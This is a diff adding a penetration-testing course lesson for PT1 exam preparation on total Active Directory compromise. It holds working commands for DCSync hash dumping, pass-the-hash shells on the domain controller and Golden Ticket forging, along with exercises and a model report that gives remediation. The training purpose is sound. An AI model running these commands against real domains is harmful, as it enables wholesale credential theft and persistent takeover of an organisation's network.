@@ -1,0 +1,134 @@
+# Active Directory Module — Lesson 5: Domain Domination (Capstone)
+
+**Methodology phase:** Post-exploitation → total domain compromise, then reporting.
+**Why it matters for PT1:** this is the win condition of the AD section — reaching **Domain Admin** and proving it by owning the domain's secrets. It's also the capstone of the whole course: it chains recon, pivoting, roasting, BloodHound, and lateral movement into one engagement, exactly as the exam does.
+
+**The finish line:** dump the domain's password database (or forge tickets to persist), grab the flags, and write it up.
+
+---
+
+## 1. DCSync — dump every hash in the domain
+
+Once you control an account with directory-replication rights (`GetChanges` + `GetChangesAll` — Domain Admins have this, and BloodHound flags anyone else who does), you can ask the DC to hand over **every** account's hash by impersonating another DC. This is **DCSync**.
+
+**With impacket-secretsdump:**
+```bash
+impacket-secretsdump corp.local/backupadmin:'NewPass123!'@dc01.corp.local -just-dc
+impacket-secretsdump -hashes ':<nthash>' corp.local/backupadmin@dc01.corp.local -just-dc
+```
+- `-just-dc` — perform DCSync: pull the domain's NTDS credentials (all users' NT hashes, plus `krbtgt`) without touching disk on the DC.
+- Add `-just-dc-user Administrator` to target just one account if you only need the DA hash.
+
+**With Mimikatz** (on-host, as a privileged user):
+```
+lsadump::dcsync /domain:corp.local /user:Administrator
+```
+
+The output includes the **`Administrator`** NT hash and the **`krbtgt`** hash. The Administrator hash is your Domain Admin key (pass-the-hash straight onto the DC). The `krbtgt` hash enables Golden Tickets (persistence — Section 3).
+
+---
+
+## 2. Prove Domain Admin — own the DC
+
+With the Administrator hash from DCSync, get a SYSTEM shell on the Domain Controller:
+```bash
+impacket-psexec -hashes ':<admin_nthash>' corp.local/Administrator@dc01.corp.local
+# or
+evil-winrm -i dc01.corp.local -u Administrator -H <admin_nthash>
+```
+`whoami` → `nt authority\system` on the DC. **You own the domain.** Grab the flags (typically on the Administrator's desktop and/or the DC): `type C:\Users\Administrator\Desktop\root.txt`.
+
+---
+
+## 3. Golden Ticket — persistence (know it, use if needed)
+
+The `krbtgt` hash signs *all* Kerberos tickets in the domain. With it you can forge a **Golden Ticket**: a TGT for any user (including a fake Domain Admin) that the domain will accept, surviving password changes of normal accounts.
+```
+# Mimikatz
+kerberos::golden /user:FakeAdmin /domain:corp.local /sid:<domain-SID> /krbtgt:<krbtgt-hash> /ptt
+```
+- `/ptt` — pass-the-ticket: inject it into the current session immediately.
+On PT1 you usually don't *need* persistence to pass, but understanding the `krbtgt` → Golden Ticket relationship is core AD knowledge and worth a mention in the report's impact section.
+
+---
+
+## 4. The full attack chain (capstone view)
+
+This is the entire course in one flow — the shape of a PT1 engagement end to end:
+
+```
+RECON        nmap the perimeter host, find the web app          (Network L1, Web module)
+FOOTHOLD     exploit the web app -> shell as a service account  (Web L4 / Network L2)
+PRIVESC      SeImpersonate -> PrintSpoofer -> SYSTEM             (Network L4)
+             loot local creds; box is domain-joined
+PIVOT        Ligolo route to the internal AD subnet             (Network L5)
+AD ENUM      nxc/ldap map users, groups, policy                 (AD L1)
+CRED ACCESS  Kerberoast svc-sql, crack offline                  (AD L2)
+PATHING      BloodHound: svc-sql -GenericAll-> backupadmin -DA  (AD L3)
+LATERAL      reset backupadmin / pass-the-hash between hosts    (AD L4)
+DOMINATION   DCSync -> Administrator + krbtgt -> own the DC      (AD L5)
+REPORT       write every step with flags, CVSS, remediation     (Reporting module)
+```
+
+Notice the sections interlock: the Windows privesc from the Network module is the same skill used on AD hosts; the pivot bridges them; the report runs alongside the whole thing. That interlock is exactly why reviewers note "even the AD section contained web apps" — the skills don't stay in their lanes.
+
+---
+
+## 5. Worked example — foothold to Domain Admin
+
+Room: **[TryHackMe — Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)** (single-DC practice) → then a multi-machine range like *Throwback*/*Holo* for the full chain.
+
+1. **Enumerate & AS-REP roast** (no creds): `impacket-GetNPUsers` finds `svc-helpdesk` with pre-auth disabled; crack it (`hashcat -m 18200`).
+2. **Authenticated enum:** `nxc smb DC -u svc-helpdesk -p <cracked> --users`; `bloodhound-python -c all`.
+3. **BloodHound path:** `svc-helpdesk` → `WriteDACL` on a group → that group is `AdminTo` the DC.
+4. **Abuse the ACL** (grant self rights, add to group), then `impacket-secretsdump ... -just-dc-user Administrator` via the now-privileged account.
+5. **Pass-the-hash to the DC:** `impacket-psexec -hashes ':<admin_hash>' corp.local/Administrator@dc01` → SYSTEM.
+6. **Grab flags**, then write the AD section of the report — each hop is a finding with its flag.
+
+> **Dead end kept in:** DCSync failed with `DRSR SessionError ... rights not held` because I ran it before the ACL abuse actually applied — group membership changes need a fresh authentication (new ticket) to take effect. Re-authenticating (new nxc/impacket session) picked up the new rights and DCSync worked. Lesson: after changing your own privileges in AD, re-auth before using them.
+
+---
+
+## 6. Exercises
+
+**Exercise 1 — DCSync.** With a privileged account, DCSync the domain and recover the Administrator and krbtgt hashes. Which flag targets just one user?
+**Exercise 2 — own the DC.** Use the Administrator hash (pass-the-hash) to get a shell on the DC and read the final flag.
+**Exercise 3 — the full chain.** On a multi-machine range, go from no-creds foothold to Domain Admin. Write down every hop and the technique used.
+**Exercise 4 — capstone report.** Write the complete AD section of a PT1 report for Exercise 3: a finding per hop, each with flag, predefined category, CVSS, write-up (with recon), and remediation.
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** `impacket-secretsdump corp.local/priv:pass@DC -just-dc` dumps all; `-just-dc-user Administrator` targets one. The `krbtgt` hash appears too — note it enables Golden Tickets.
+
+**Exercise 2.** `impacket-psexec -hashes ':<admin_nthash>' corp.local/Administrator@DC` or `evil-winrm -i DC -u Administrator -H <hash>`. `whoami` → `nt authority\system`; the flag is on the Administrator desktop / DC.
+
+**Exercise 3.** A representative chain: AS-REP roast → crack → enumerate → BloodHound path → ACL/Kerberoast abuse → lateral movement (pass-the-hash) → DCSync → DA. Your hop log is the report backbone.
+
+**Exercise 4 — model (one hop shown; repeat per hop).**
+> **Title:** Full domain compromise via DCSync from an over-privileged account (Critical).
+> **Category (predefined):** Privilege Escalation / Broken Access Control.
+> **Flag:** `THM{...}`
+> **CVSS:** 9.1 (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N`)
+> **Affected:** corp.local, DC `dc01.corp.local`.
+> **Initial reconnaissance:** BloodHound identified `backupadmin` with replication rights (GetChanges/GetChangesAll) over the domain.
+> **Exploitation:** `impacket-secretsdump -just-dc` as `backupadmin` performed DCSync, recovering the `Administrator` and `krbtgt` NT hashes; pass-the-hash with `impacket-psexec` yielded a SYSTEM shell on the DC.
+> **Impact:** Complete, persistent compromise of the entire Active Directory domain (all credentials, including krbtgt → Golden Ticket persistence).
+> **Remediation:** Restrict directory-replication rights to Domain Controllers only; enforce AD tiering; monitor for DCSync (event 4662 with replication GUIDs) and rotate `krbtgt` twice if compromise is suspected.
+
+</details>
+
+---
+
+## 7. Carry forward — Active Directory module & course complete
+
+The AD chain, end to end:
+
+- **Lesson 1 Enumeration** → **2 Kerberos roasting** → **3 BloodHound pathing** → **4 Lateral movement & credential access** → **5 DCSync & domain domination.**
+- The through-line: one credential, enumerated relentlessly, walks up abusable misconfigurations to Domain Admin — and every hop is a report finding with its flag.
+
+**You now have the whole course:** Web (6) · Reporting (3) · Network (5) · Active Directory (5), on top of the README and 18-week study plan. Work the study plan, do every "report it" exercise, sit the timed mock — and you'll walk into the PT1 exam having already rehearsed all three sections and the report that grades them.
+
+**Sources for exam facts across the course:** [TryHackMe PT1 cert](https://tryhackme.com/certification/junior-penetration-tester) · [MRE](https://mresecurity.com/blog/try-hack-me-pt-1-certification-review-entry-level-penetration-testing-exam) · [Technomancer](https://jacnow.net/technomancer/tryhackme-pt1-certification-review/) · [Motasem](https://motasem-notes.net/tryhackme-pt1-certification-review/) · [happycamper84](https://happycamper84.medium.com/tryhackme-junior-penetration-tester-pt1-ad-exam-review-b9b5fa225f44) · [Myinside](https://medium.com/@teammyinside/tryhackme-pt1-exam-review-is-it-really-for-juniors-6a9540ccf3d8).
